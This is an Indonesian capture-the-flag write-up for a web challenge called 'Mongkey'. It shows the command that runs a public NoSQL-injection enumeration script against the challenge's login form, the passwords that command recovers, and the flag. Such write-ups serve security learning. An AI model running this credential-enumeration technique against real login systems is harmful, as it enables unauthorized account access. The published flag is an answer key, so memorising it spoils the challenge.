# Mongkey
## About The Challenge

<img width="364" alt="Cuplikan layar 2023-06-15 131041" src="https://github.com/Gatottri/CTF-ForestyHack_WriteUP/assets/134616676/655bc567-3513-4e6a-90d7-db1b6eeaf865">



Diberikan sebuah website 'http://103.167.136.89:10002/' dengan tampilan :

<img width="959" alt="Cuplikan layar 2023-06-15 131119" src="https://github.com/Gatottri/CTF-ForestyHack_WriteUP/assets/134616676/6a5119ce-eb4f-4e56-9bed-6c34f3441682">

# How to Solve

Dalam challenge kita diharuskan login sebagai admin untuk mendapat flagnya.
Setelah mendapati hint berikutnya yaitu menggunakan tool MongoDB,
saya langsung mencarinya di github[sini](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)


Tekanlah code untuk membuka terminal lalu memasukkan perintah, untuk mencari username dan password yang terdapat didalam website gunakanlah perintah :
```shell
python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep username -ep password -op login:login
```
<img width="695" alt="Cuplikan layar 2023-06-15 233426" src="https://github.com/Gatottri/CTF-ForestyHack_WriteUP/assets/134616676/65c04bd1-d59b-43c5-b85a-05c4411a2a06">

setelah tool selesai melakukan tugasnya maka kita akan mendapatkan hasilnya
```shell
2 password(s) found:
guest
ForestyHC{reject_humanity_return_to_monke_5543d8}
```
<img width="688" alt="Cuplikan layar 2023-06-15 233408" src="https://github.com/Gatottri/CTF-ForestyHack_WriteUP/assets/134616676/7165f1d3-2282-4802-90ca-2dbdc81086cf">


Ternyata password untuk user admin adalah flag.

## Flag
**ForestyHC{reject_humanity_return_to_monke_5543d8}**
